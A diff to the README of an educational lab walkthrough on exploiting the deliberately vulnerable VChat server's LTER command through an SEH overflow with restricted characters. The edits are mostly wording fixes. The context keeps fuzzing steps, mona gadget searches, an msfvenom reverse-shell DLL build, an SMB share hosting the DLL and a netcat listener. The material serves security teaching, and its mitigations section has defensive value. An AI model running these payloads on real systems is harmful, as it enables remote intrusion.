@@ -7,25 +7,23 @@
 
 ___
 
+Unlike in previous exploits, the main hurdle will not be space limitations on the stack, but the characters we are able to use in the payload sent to exploit the VChat server. At first glance, this may not seem to be a big issue; however, our shellcode that has been compiled into machine code is represented and injected into the target process as a stream of characters. Any limitation on the valid inputs to a program may limit not only the instructions available to us but also the constant values we may use in the shell code.
 
-Unlike in previous exploits, the main hurdle will not be space limitations on the stack, but the characters we are able to use in the exploit. At first glance, this may not seem to be a big issue; however, our shellcode that has been compiled into machine code is represented and injected into the target process as a stream of characters. Any limitation on the valid inputs to a program may limit not only the instructions available to us but also the constant values we may use in the shell code.
-
-During this exploit we will use techniques to overcome character restrictions on the input we provide to the target application, these are commonly referred to as "Bad Characters" when exploiting remote processes over a TCP or UDP connection. In this case our limitations are imposed not only by the fact our communications are interpreted as strings, and the characteristics of the functions used to handle them (*strncpy* and *strcpy*). However, the `LTER` function also manipulates the strings it receives; in this way, we need to make more explicit use of encoders to ensure our payload is preserved and can successfully execute on the target system without being corrupted by the LTER command manipulations. 
+During this exploit we will use techniques to overcome character restrictions on the input we provide to the target application, these limitations are commonly referred to as "Bad Characters" when exploiting remote processes over a TCP or UDP connections. In this case our limitations are imposed not only by the fact our communications are interpreted as strings, and the characteristics of the functions used to handle them (*strncpy* and *strcpy*). However, the `LTER` function also manipulates the strings it receives; in this way, we need to make more explicit use of encoders to ensure our payload is preserved and can successfully execute on the target system without being corrupted by the LTER command manipulations.
 
 Encoders modify a given binary to be encoded as some other set of bytes that can be transformed back into their original state. A decoding function is then appended to our transformed shellcode, which will reconstruct the original binary that we originally used as input to the encoder through some methods.
-
 
 > [!NOTE]
 >  Please set up the Windows and Linux systems as described in [SystemSetup](./SystemSetup/README.md)!
 >
-> The Final shellcode in this exploit is not reliable in its execution.
+> The Final shellcode in this exploit is not always reliable in its execution. The Multi-Stage method should not be used, the DLL sideloading has proven to work reliably.
 ## VChat Setup and Configuration
 This section covers the compilation process and use of the VChat Server. We include instructions for both the original VChat code, which was compiled with MinGW and GCC on Windows, and the newly modified code, which can be compiled with the Visual Studio C++ compiler.
 
 ### Visual Studio
 1. Open the [Visual Studio project](https://github.com/DaintyJet/vchat-fork/tree/main/Server/Visual%20Studio%20Projects/DLL/Essfun) for the *essfunc* DLL.
 2. Build the project; as this contains inline assembly, the target DLL file must be compiled as a x86 DLL (32-bits).
-3. Copy the Resulting DLL from the *Debug* folder in the [Essfunc Project](https://github.com/DaintyJet/vchat-fork/tree/main/Server/Visual%20Studio%20Projects/DLL/Essfun/Debug) into the *Debug* folder in the [VChat Project](https://github.com/DaintyJet/vchat-fork/tree/main/Server/Visual%20Studio%20Projects/EXE/VChat/Debug)
+3. Copy the Resulting DLL from the *Debug* folder in the [Essfunc Project](https://github.com/DaintyJet/vchat-fork/tree/main/Server/Visual%20Studio%20Projects/DLL/Essfun/Debug) into the *Debug* folder in the [VChat Project](https://github.com/DaintyJet/vchat-fork/tree/main/Server/Visual%20Studio%20Projects/EXE/VChat/Debug).
 
 	<img src="Images/VS-Comp.png">
 
@@ -47,7 +45,7 @@ Compile VChat and its dependencies if they have not already been compiled. This 
       * ```-shared -o essfunc.dll```: We create a DLL "essfunc.dll", these are equivalent to the [shared library](https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html) in Linux.
       * ```-Wl,--out-implib=libessfunc.a```: We tell the linker to generate an import library "libessfunc.a" [2].
       * ```-Wl,--image-base=0x62500000```: We specify the [Base Address](https://learn.microsoft.com/en-us/cpp/build/reference/base-base-address?view=msvc-170) as ```0x62500000``` [3].
-      * ```essfunc.o```: We build the DLL based on the object file "essfunc.o"
+      * ```essfunc.o```: We build the DLL based on the object file "essfunc.o".
 3. Compile the VChat application.
 	```powershell
 	# Compile and Link VChat
@@ -63,14 +61,14 @@ The following sections cover the process that should (Or may) be followed when p
 ### Information Collecting
 We want to understand the VChat program and how it works in order to exploit it effectively. Before diving into the specifics of how VChat behaves, the most important information for us is the IP address of the Windows VM that runs VChat and the port number that VChat runs on.
 
-1. **Windows** Launch the VChat application
+1. **Windows** Launch the VChat application.
 	* Click on the Icon in File Explorer when it is in the same directory as the essfunc DLL.
-2. (Optional) **Linux**: Run NMap
+2. (Optional) **Linux**: Run NMap.
 	```sh
 	# Replace the <IP> with the IP of the machine.
 	$ nmap -A <IP>
 	```
-   * We can think of the "-A" flag as the term aggressive as it does more than the normal scans, and is often easily detected.
+   * We can think of the `-A` flag as the term aggressive as it does more than the normal scans, and is often easily detected.
    * This scan will also attempt to determine the version of the applications; this means when it encounters a non-standard application such as *VChat*, it can take 30 seconds to 1.5 minutes, depending on the speed of the systems involved, to finish scanning. You may find the scan ```nmap <IP>``` without any flags to be quicker!
    * Example results are shown below:
 
@@ -84,7 +82,7 @@ We want to understand the VChat program and how it works in order to exploit it 
 	# telnet 127.0.0.1 9999
 	```
    * Once you have connected, try running the ```HELP``` command, this will give us some information regarding the available commands the server processes and the arguments they take. This provides us a starting point for our [*fuzzing*](https://owasp.org/www-community/Fuzzing) work.
-   * Exit with ```CTL+]```.
+   * Exit with `CTL+]`.
    * An example is shown below.
 
 		![Telnet](Images/Telnet.png)
@@ -96,10 +94,10 @@ We want to understand the VChat program and how it works in order to exploit it 
 	* Now, trying every possible combinations of strings would get quite tiresome, so we can use the technique of *fuzzing* to automate this process as discussed later in the exploitation section.
 	* In this case we will do some fuzzing to keep the exploit sections relatively consistent, but as you can see we know crashing this command will not take much!
 
-### Dynamic Analysis 
+### Dynamic Analysis
 This phase of exploitation involves launching the target application or binary and examining its behavior based on the input we provide. We can do this using automated fuzzing tools or manually generated input.
 
-The actions the *LTER* command takes on the given input are slightly different compared to those of the other functions that in the VChat/Vulnserver application. This means our Dynamic Analysis phase will be slightly longer!
+The actions the *LTER* command takes on the given input are slightly different compared to those of the other functions that in the VChat/Vulnserver application. This means our Dynamic Analysis phase will be slightly longer! However the end goal is still to produce an exploit string in the format of `padding-bytes|address-to-overwrite-return-address|shell-code`, where | means concatenation.
 #### Launch VChat
 1. Open Immunity Debugger.
 
@@ -111,20 +109,20 @@ The actions the *LTER* command takes on the given input are slightly different c
 
 2. Attach VChat: There are two options!
    1. (Optional) When the VChat is already Running.
-        1. Click File -> Attach
+        1. Click File -> Attach.
 
 			<img src="Images/I2a.png" width=200>
 
-		2. Select VChat 
+		2. Select VChat.
 
 			<img src="Images/I2b.png" width=500>
 
    2. When VChat is not already Running -- This is the most reliable option!
-        1. Click File -> Open, Navigate to VChat
+        1. Click File -> Open, Navigate to VChat.
 
 			<img src="Images/I3-1.png" width=800>
 
-        2. Click "Debug -> Run"
+        2. Click Debug -> Run.
 
 			<img src="Images/I3-2.png" width=800>
 
@@ -152,7 +150,7 @@ SPIKE is a C based fuzzing tool commonly used by professionals, it is available 
 	s_string_variable("*");
 	```
     * ```s_readline();```: Return the line from the server.
-    * ```s_string("LTER ");```: Specifies that we start each message with the *String* KSTET.
+    * ```s_string("LTER ");```: Specifies that we start each message with the *String* LTER.
     * ```s_string_variable("*");```: This specifies a String that we will mutate over. We can set it to * to say "any," as we do in our case.
 4. Use the Spike Fuzzer.
 	```
@@ -166,7 +164,7 @@ SPIKE is a C based fuzzing tool commonly used by professionals, it is available 
 	* ```<SPIKE-Script>```: Script to run through the interpreter.
 	* ```<SKIPVAR>```: Skip to the n'th **s_string_variable**, 0 -> (S - 1) where S is the number of variable blocks.
 	* ```<SKIPSTR>```: Skip to the n'th element in the array that is **s_string_variable**, they internally are an array of strings used to fuzz the target.
-5. Observe the results on VChat's terminal output. <!--Need to start here! -->
+5. Observe the results on VChat's terminal output.
 
 	<img src="Images/I4.png" width=600>
 
@@ -176,12 +174,12 @@ SPIKE is a C based fuzzing tool commonly used by professionals, it is available 
 
 	<img src="Images/I4d.png" width=600>
 
-7. We can look at the comparison of the Register values before and after the fuzzing in Immunity Debugger. Here, we can see the EIP has **not been overwritten** with a series of `A`s (`0x41`). This means we likely overwrote a SEH frame on the stack! 
-	* Before
+7. We can look at the comparison of the Register values before and after the fuzzing in Immunity Debugger. Here, we can see the EIP has **not been overwritten** with a series of `A`s (`0x41`). This means we likely overwrote a SEH frame on the stack!
+	* Before:
 
 		<img src="Images/I7.png" width=600>
 
-	* After
+	* After:
 
 		<img src="Images/I8.png" width=600>
 
@@ -209,7 +207,7 @@ SPIKE is a C based fuzzing tool commonly used by professionals, it is available 
 
 	<img src="Images/I9.png" width=600>
 
-3. Notice that the EIP register reads `75FB6819` and remains unchanged, but we can see in this case the SEH record's handler was overwritten with `396D4538`. We can use the [pattern_offset.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb) script to determine the address offset based on our search string's position in the pattern. 
+3. Notice that the EIP register reads `75FB6819` and remains unchanged, but we can see in this case the SEH record's handler was overwritten with `396D4538`. We can use the [pattern_offset.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb) script to determine the address offset based on our search string's position in the pattern.
 	```
 	$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 396D4538
 	```
@@ -247,11 +245,11 @@ SPIKE is a C based fuzzing tool commonly used by professionals, it is available 
 
 	https://github.com/DaintyJet/VChat_LTER/assets/60448620/56abcbb0-42fc-433f-8730-5c55754df014
 
-   1. Click on the black button highlighted below, and enter the address we decided in the previous step
+   1. Click on the black button highlighted below, and enter the address we decided in the previous step.
 
 		<img src="Images/I16.png" width=600>
 
-   2. Set a breakpoint at the desired address (right-click)
+   2. Set a breakpoint at the desired address (right-click).
 
 		<img src="Images/I17.png" width=600>
 
@@ -304,19 +302,19 @@ As introduced at the start of this walkthrough, some programs disallow or modify
 
 	<img src="Images/I22.png" width=600>
 
-6. `mona.py` again provides us with a better method to view and summerize this information! We can use the following command: 
+6. `mona.py` again provides us with a better method to view and summerize this information! We can use the following command:
 
 	```
 	!mona cmp -f C:\Users\Malware Analysis\AppData\Local\VirtualStore\Program Files (x86)\Immunity Inc\Immunity Debugger\bytearray.bin -a <memory address of array>
 	```
-	* This compares the contents of the bytearry we had generated, and the contents starting at an address we specify. 
+	* This compares the contents of the bytearray we had generated, and the contents starting at an address we specify.
 		* `!mona cmp`: Mona comparison function.
 		* `-f`: Compare the contents of a file (You will need to modify this to match the file's location on your computer!).
 		* `-a`: Compare the contents of a memory address.
 
 	https://github.com/DaintyJet/VChat_LTER/assets/60448620/0aa8ddb2-ec19-4a56-abec-80008a490a9c
 
-	1. Get the array's starting address. The easiest way to do this is to read the address off the stack view pane. We can see from the memory dump (and stack ASCII dump) that our character array starts 2 bytes in from the stating address. 
+	1. Get the array's starting address. The easiest way to do this is to read the address off the stack view pane. We can see from the memory dump (and stack ASCII dump) that our character array starts 2 bytes in from the stating address.
 
 		<img src="Images/I23.png" width=600>
 
@@ -379,7 +377,7 @@ As introduced at the start of this walkthrough, some programs disallow or modify
 		0107F21E  Possibly bad chars: 80
 		0107F21E  Bytes omitted from input: 00 0a 0d
 		```
-7. We can now see that starting at the value `0x80`, the contents of our file generated with `!mona bytearray` differ from the contents in memory
+7. We can now see that starting at the value `0x80`, the contents of our file generated with `!mona bytearray` differ from the contents in memory.
 	```
 		0107F21E   70 |73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f 80 81 82| File
 		0107F21E      |                                       01 02 03| Memory
@@ -392,7 +390,7 @@ As introduced at the start of this walkthrough, some programs disallow or modify
 	```
 	!mona seh -cm safeseh=off -cp nonull,ascii -o -cpb '\x0a\x0d'
 	```
-	* `seh`: Locate seh gadgets `pop pop ret` to enter into our controller region of the stack from a SEH exploit. 
+	* `seh`: Locate seh gadgets `pop pop ret` to enter into our controller region of the stack from a SEH exploit.
 	* `-cm safeseh=off`: Exclude safeseh modules.
 	* `-cp nonull,ascii`: Only show pointers (Addresses) that do not contain null characters (`0x00`) and are ASCII values (`0x00` - `0x7F`).
 	* `-o`: Ignore OS modules.
@@ -402,7 +400,7 @@ As introduced at the start of this walkthrough, some programs disallow or modify
 
 	* In this case, we have 17 pointers down from the previous 34.
 
-2. Modify your exploit code to reflect [exploit5.py](./SourceCode/exploit5.py) and run it against VChat to verify that this works. We do this to ensure we can utilize the SEH gadget with the character restrictions in order to exploit shellcode on the stack. 
+2. Modify your exploit code to reflect [exploit5.py](./SourceCode/exploit5.py) and run it against VChat to verify that this works. We do this to ensure we can utilize the SEH gadget with the character restrictions in order to exploit shellcode on the stack.
 
 	https://github.com/DaintyJet/VChat_LTER/assets/60448620/9445880b-f509-4e3c-9b2a-3329cf40f6bd
 
@@ -424,7 +422,7 @@ As introduced at the start of this walkthrough, some programs disallow or modify
 
 		<img src="Images/I27b.png" width=600>
 
-	5. Once we pass the exception using `Shift + F7`, we can step through the program and see we have arrived back onto the stack near the buffer we control, but we have arrived 4-bytes ahead of the address we used to overwrite the SEH handler! 
+	5. Once we pass the exception using `Shift + F7`, we can step through the program and see we have arrived back onto the stack near the buffer we control, but we have arrived 4-bytes ahead of the address we used to overwrite the SEH handler!
 
 		<img src="Images/I27c.png" width=600>
 
@@ -454,7 +452,7 @@ As introduced at the start of this walkthrough, some programs disallow or modify
 2. For the encoder to work, we will need to generate some files containing the resulting machine code's binary. This can be done in 2 different ways.
 
 	1. Modify and use the program [generate_shell.py](./SourceCode/generate_shell.py) to generate both files.
-	2. Use the Python interpreter directly to generate the files
+	2. Use the Python interpreter directly to generate the files.
 		* ` python -c "buff= b'\xe9\x43\xf2\xff\xff'; fd = open('jmp_l.bin', 'wb'); fd.write(buff)"`: Generate the long jump binary.
 		* `python -c "buff= b'\xeb\x80'; fd = open('jmp_s.bin', 'wb'); fd.write(buff)"`: Generate the short jump binary.
 3. Now we can try using preexisting encoders, some easy one to try are provided by [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html). We omit the lengthy bad character list since the main challenge at this stage is the space we have to work with, which is what this example attempts to point out!
@@ -649,7 +647,7 @@ As introduced at the start of this walkthrough, some programs disallow or modify
 			0000 0000 0000 0000 0000 0000 0000 0000
 			```
 
-			* This is possible due to the way the [boolean `AND`](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/operators/boolean-logical-operators) operation works. Each bit is compared and the result is shown below. 
+			* This is possible due to the way the [boolean `AND`](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/operators/boolean-logical-operators) operation works. Each bit is compared and the result is shown below.
 				| Bit X | Bit Y | Result of X & Y |
 				| ----- | ----- | --------------- |
 				|   0   |   0   |       0         |
@@ -1002,7 +1000,7 @@ With this exploit, we will use the well-known [msfvenom](https://docs.metasploit
 <!-- https://zflemingg1.gitbook.io/undergrad-tutorials/walkthroughs-osce/vulnserver-lter-command -->
 
 #### DLL SideLoading
-This is the most reliable version of the attack that we have found, as we do not face many encoding/decoding errors, and it has the least uncertainty involved as we are not guessing the socket's file descriptor as is done in the [Multi-Staged](#multi-stage) attack. 
+This is the most reliable version of the attack that we have found, as we do not face many encoding/decoding errors, and it has the least uncertainty involved as we are not guessing the socket's file descriptor as is done in the [Multi-Staged](#multi-stage) attack.
 
 
 As we have done before, we need to realign the stack pointer stored in the `ESP` register; since we have jumped to the start of the buffer, there are a few thousand `A`s between us and the top of the stack. Additionally, if we do not move the stack pointer as the last instruction used by the decoder in the shellcode is `PUSH EAX`, the second stage shellcode is written to the stack following the `JMP <Head>` instruction, so we would never reach it!
@@ -1057,7 +1055,7 @@ As we have done before, we need to realign the stack pointer stored in the `ESP`
 
 Now we can generate our *first stage* shellcode, unlike the [Multi-Staged](#multi-stage) exploit, we will not be using the `recv(...)` function to directly load our shellcode onto the stack, we will instead be using `LoadLibraryA(...)` combined with a malicious DLL to generate our reverse shell. More details on malicious DLLs and the `LoadLibraryA(...)` function are contained in the [VChat_DLL](https://github.com/DaintyJet/VChat_KSTET_DLL) writeup.
 
-1. Locate the address of the `LoadLibraryA` function. To get this information, we can use [Arwin](https://github.com/xinwenfu/arwin) as shown below: 
+1. Locate the address of the `LoadLibraryA` function. To get this information, we can use [Arwin](https://github.com/xinwenfu/arwin) as shown below:
 	```
 	arwin.exe kernel32 LoadLibraryA
 	```
@@ -1085,7 +1083,7 @@ Now we can generate our *first stage* shellcode, unlike the [Multi-Staged](#mult
 
 3. Now you can assemble the shellcode in the [dll_shellcode.s](./SourceCode/dll_shellcode.s) into it's associated machine code with the `nasm` program in the Kali Linux machine as shown below.
 	```
-	$ nasm -f elf32 -o shellcode.o dll_shellcode.asm 
+	$ nasm -f elf32 -o shellcode.o dll_shellcode.asm
 	```
 4. We can extract the hexcodes used as input into our encoder the [Automatic-ASCII-Shellcode-Subtraction-Encoder](https://github.com/andresroldan/Automatic-ASCII-Shellcode-Subtraction-Encoder) used in the [Blog](https://fluidattacks.com/blog/vulnserver-lter-seh/). This is done using the [extract.sh](./SourceCode/extract.sh) script shown below.
 	```sh
@@ -1110,14 +1108,14 @@ Now we can generate our *first stage* shellcode, unlike the [Multi-Staged](#mult
 	```
 	* Replace the `<SHELLCODE>`: With the hex string produced when you ran the [extract.sh](./SourceCode/extract.sh) script.
 
-6. Use the resulting shellcode as shown in the [exploit13a-DLL.py](./SourceCode/exploit13-DLL.py) program. As done previously set a breakpoint and step through the program to verify our shellcode is properly decoded. 
+6. Use the resulting shellcode as shown in the [exploit13a-DLL.py](./SourceCode/exploit13-DLL.py) program. As done previously set a breakpoint and step through the program to verify our shellcode is properly decoded.
 
 	<img src="Images/Exploit13DLL.png">
 
 
 
 Now that we have our first stage shellcode, we can generate the second stage, which is contained in a remotely hosted DLL.
-1. Use [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) to generate the malicious DLL as it is capable of formatting output for use as a DLL. In this case the shellcode will be contained in the DLL Main function as discussed in the [VChat_DLL](https://github.com/DaintyJet/VChat_KSTET_DLL) writeup! 
+1. Use [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) to generate the malicious DLL as it is capable of formatting output for use as a DLL. In this case the shellcode will be contained in the DLL Main function as discussed in the [VChat_DLL](https://github.com/DaintyJet/VChat_KSTET_DLL) writeup!
 
 ```
 $ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=8080 EXITFUNC=none -f dll -o mal.dll
@@ -1130,20 +1128,20 @@ $ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.0.2.1
     * `LPORT=8080`: The port on the remote listening host's traffic should be directed to in this case port 8080.
     * `EXITFUNC=none`: The runs without an exit function, the program will likely crash after this finishes executing!
 * `-f`: The output format.
-    * `dll`: Format for use as a DLL. 
+    * `dll`: Format for use as a DLL.
 
-2. Use the [`impacket-smbserver`](https://www.kali.org/tools/impacket-scripts/#impacket-smbserver) to host the malicious DLL. 
+2. Use the [`impacket-smbserver`](https://www.kali.org/tools/impacket-scripts/#impacket-smbserver) to host the malicious DLL.
 	```
 	$ sudo impacket-smbserver -smb2support ABCD .
 	```
 	* `sudo`: This command and operation requires root privileges to bind to the well known SMB port 445.
-	* [`impacket-smbserver`](https://www.kali.org/tools/impacket-scripts/#impacket-smbserver):  This is the command the launches a SMB server and add a share as specified. 
+	* [`impacket-smbserver`](https://www.kali.org/tools/impacket-scripts/#impacket-smbserver):  This is the command the launches a SMB server and add a share as specified.
 	* `smb2support`: Enable SMB2 Support.
 	* `ABCD`: Name of the current Share. This is chosen to be short or longer to reduce the complexity of the shellcode generation.
-	* `.`: This is the current directory we are in, we can specify a path to share a specific directory. 
+	* `.`: This is the current directory we are in, we can specify a path to share a specific directory.
 
 
-With the second stage prepped and exposed on our network, we can perform the final exploitation. 
+With the second stage prepped and exposed on our network, we can perform the final exploitation.
 1. Start a local [netcat](https://linux.die.net/man/1/nc) listener on our Kali machine for port 8080.
 
 	```
@@ -1154,18 +1152,23 @@ With the second stage prepped and exposed on our network, we can perform the fin
 	* `v`: Verbose output.
 	* `p`: Set to listen on a port, in this case, port 8080.
 
-4. If the SMB share has not been started, navigate to where your malicious DLL is located and start it. 
+4. If the SMB share has not been started, navigate to where your malicious DLL is located and start it.
 	```
 	$ sudo impacket-smbserver -smb2support ABCD .
 	```
 	* `sudo`: This command and operation requires root privileges to bind to the well-known SMB port 445.
-	* [`impacket-smbserver`](https://www.kali.org/tools/impacket-scripts/#impacket-smbserver):  This is the command the launches a SMB server and add a share as specified. 
+	* [`impacket-smbserver`](https://www.kali.org/tools/impacket-scripts/#impacket-smbserver):  This is the command the launches a SMB server and add a share as specified.
 	* `smb2support`: Enable SMB2 Support.
 	* `A`: Name of the current Share. This is chosen to be short as we would complicate the shellcode generation otherwise.
-	* `.`: This is the current directory we are in, we can specify a path to share a specific directory. 
+	* `.`: This is the current directory we are in, we can specify a path to share a specific directory.
 
 5. Run the [exploit13a-DLL.py](./SourceCode/exploit13-DLL.py) program, and open the terminal you have the netcat listener on!
 #### Multi-Stage
+> [!NOTE]
+> I have observed that the first stage shellcode will work as expected and can guess all of the possible file descriptors for the program's socket. It is likely the case that Windows's behavior chnages when a SEH exception is raised compared to the enviorment the execution enviornment the original [KSTET_Multi](https://github.com/DaintyJet/VChat_KSTET_Multi) attack occurs in.
+>
+> This section is included for refernce.
+
 We will perform a similar exploit to one done for the [KSTET_Multi](https://github.com/DaintyJet/VChat_KSTET_Multi) exploit, as we will first inject an encoded shellcode to receive the second stage shellcode that is not encoded (It does not account for the restrictive character set), writing it to the stack, and then entering the newly written second stage. This is done so we only have to create the smaller first stage in compliance with the allowed character set, as the first stage will enable us to bypass those restrictions. We do this since it is much easier to create the smaller first stage within the restricted character set than it is for us to generate the more complicated metasploit payloads in a format that preserves their functionality. By instead using the first stage to receive the more complicated shellcode and directly write it to the stack we do not need to be worried about how the original programs' logic changes the data we send, as we have bypassed it with the first stage.
 
 1. As we have done before we need to realign the stack pointer stored in the `ESP` register, since we have jumped to the start of the buffer there are a few thousand `A`s between us and the top of the stack. Additionally, if we do not move the stack pointer as the last instruction used by the decoder in the shellcode is `PUSH EAX`, the second stage shellcode is written to the stack following the `JMP <Head>` instruction, so we would never reach it!
@@ -1342,7 +1345,7 @@ The mitigations we will be using in the following examination are:
 * [Buffer Security Check (GS)](https://github.com/DaintyJet/VChat_Security_Cookies): Security Cookies are inserted on the stack to detect when critical data such as the base pointer, return address or arguments have been overflowed. Integrity is checked on function return.
 * [Data Execution Prevention (DEP)](https://github.com/DaintyJet/VChat_DEP_Intro): Uses paged memory protection to mark all non-code (.text) sections as non-executable. This prevents shellcode on the stack or heap from being executed as an exception will be raised.
 * [Address Space Layout Randomization (ASLR)](https://github.com/DaintyJet/VChat_ASLR_Intro): This mitigation makes it harder to locate where functions and datastructures are located as their region's starting address will be randomized. This is only done when the process is loaded, and if a DLL has ASLR enabled it will only have it's addresses randomized again when it is no longer in use and has been unloaded from memory.
-* [SafeSEH](https://github.com/DaintyJet/VChat_SEH): This is a protection for the Structured Exception Handing mechanism in Windows. It validates that the exception handler we would like to execute is contained in a table generated at compile time. 
+* [SafeSEH](https://github.com/DaintyJet/VChat_SEH): This is a protection for the Structured Exception Handing mechanism in Windows. It validates that the exception handler we would like to execute is contained in a table generated at compile time.
 * [SEHOP](https://github.com/DaintyJet/VChat_SEH): This is a protection for the Structured Exception Handing mechanism in Windows. It validates the integrity of the SEH chain during a runtime check.
 * [Control Flow Guard (CFG)](https://github.com/DaintyJet/VChat_CFG): This mitigation verifies that indirect calls or jumps are performed to locations contained in a table generated at compile time. Examples of indirect calls or jumps include function pointers being used to call a function or if you are using `C++` virtual functions, which would be considered indirect calls as you index a table of function pointers.
 * [Heap Integrity Validation](https://github.com/DaintyJet/VChat_Heap_Defense): This mitigation verifies the integrity of a heap when operations are performed on it, such as allocations or frees of heap objects.
@@ -1370,7 +1373,7 @@ This exploit is similar to all the previous exploits except that an exception is
 * `Defense: SafeSEH`: This would prove effective as long as the SEH chain overflowed is contained in a module that has SAFESEH enabled, as the handler in the SEH record would no longer point to an address contained in the SAFESEH table.
 * `Defense: SEHOP`: This would prove effective as overflowing the SEH handler would overwrite the next pointer, breaking the SEH chain which means the SEHOP mitigation would be unable to verify the SEH chain by traversing from the start till the end.
 * `Defense: Heap Integrity Validation`: This does not affect our exploit as we do not leverage the Windows Heap.
-* `Defense: Control Flow Guard`: This does not affect our exploit as we do not leverage indirect calls or jumps. 
+* `Defense: Control Flow Guard`: This does not affect our exploit as we do not leverage indirect calls or jumps.
 > [!NOTE]
 > `Defense: Buffer Security Check (GS)`: If the application improperly initializes the global security cookie or contains additional vulnerabilities that can leak values on the stack, then this mitigation strategy can be bypassed.
 >
@@ -1426,7 +1429,7 @@ void Function3(char* Input) {
 	strcpy(Buffer2S, Input);
 }
 ```
-As in previous exploits, `Function3(char* Input)` performs a copy into a buffer that can hold 2000 bytes from one that may hold 4096 bytes, leading to an overflow. 
+As in previous exploits, `Function3(char* Input)` performs a copy into a buffer that can hold 2000 bytes from one that may hold 4096 bytes, leading to an overflow.
 <!-- ----
 The manual encoding section described in the original [Blog](https://fluidattacks.com/blog/vulnserver-lter-seh/) cannot be applied to this case directly. In the original blog, the procedure used by the author for moving the ESP to the end of the C buffer can be described as:
 
@@ -1475,19 +1478,19 @@ The following graphs present how ESP changes in my case (from 0x0101EC2C to 0x01
 
 ## Test code
 
-1. [exploit0.py](SourceCode/exploit0.py): Send 5000 `A`s to crash the server.   
+1. [exploit0.py](SourceCode/exploit0.py): Send 5000 `A`s to crash the server.
 2. [exploit1.py](SourceCode/exploit1.py): Sending a cyclic pattern of chars to identify the offset that we need to inject to control EIP.
 3. [exploit2.py](SourceCode/exploit2.py): Send 4 B's at the location of the offset identified to confirm.
-4. [exploit3.py](SourceCode/exploit3.py): Replacing the bytes at the offset discovered by exploit1.py with the address of *POP EBX, POP EBP, RETN*. **Contains Bad Characters**! 
-5. [exploit4x.py](SourceCode/exploit4a.py): Send data-array of all possible ASCII character values various generation methods are provided. 
+4. [exploit3.py](SourceCode/exploit3.py): Replacing the bytes at the offset discovered by exploit1.py with the address of *POP EBX, POP EBP, RETN*. **Contains Bad Characters**!
+5. [exploit4x.py](SourceCode/exploit4a.py): Send data-array of all possible ASCII character values various generation methods are provided.
 	* [exploit4a.py](SourceCode/exploit4a.py): Array Generated by `mona.py`.
 	* [exploit4b.py](SourceCode/exploit4b.py): Array Generated with multi-line for loop.
 	* [exploit4c.py](SourceCode/exploit4c.py): Array Generated by a one-liner.
-6. [exploit5.py](SourceCode/exploit5.py): Replacing the bytes at the offset discovered by exploit1.py with the address of *POP EBX, POP EBP, RETN*. **Does Not Contain Bad Characters**! 
+6. [exploit5.py](SourceCode/exploit5.py): Replacing the bytes at the offset discovered by exploit1.py with the address of *POP EBX, POP EBP, RETN*. **Does Not Contain Bad Characters**!
 7. [exploit6.py](SourceCode/exploit6.py): Add conditional jump to avoid bad characters.
 8. [exploit7a.py](SourceCode/exploit7a.py): MSF-Encoding example (Does not work, due to containing bad characters).
 9. [exploit7a.py](SourceCode/exploit7a.py): Aligns ESP.
-10. [exploit8.py](SourceCode/exploit8.py): Zeros out the EAX register, avoids bad characters by using two and operations. 
+10. [exploit8.py](SourceCode/exploit8.py): Zeros out the EAX register, avoids bad characters by using two and operations.
 11. [exploit9.py](SourceCode/exploit9.py): Adds short Jump.
 12. [exploit10.py](SourceCode/exploit10.py): Realigns stack.
 13. [exploit11.py](SourceCode/exploit11.py): Adds encoded long jump.
@@ -1495,7 +1498,7 @@ The following graphs present how ESP changes in my case (from 0x0101EC2C to 0x01
 15. [exploit13-DLL.py](SourceCode/exploit13-DLL.py): Inject encoded `LoadLibraryA(...)`.
 16. [exploit13-MULT](SourceCode/exploit13a-MULT.py): Code reuse and multi-stage exploit.
 	* [exploit13a-MULT.py](SourceCode/exploit13a-MULT.py): Inject the encoded first stage.
-	* [exploit13b-MULT.py](SourceCode/exploit13a-MULT.py): Send the second stage. 
+	* [exploit13b-MULT.py](SourceCode/exploit13a-MULT.py): Send the second stage.
 
 ## References
 
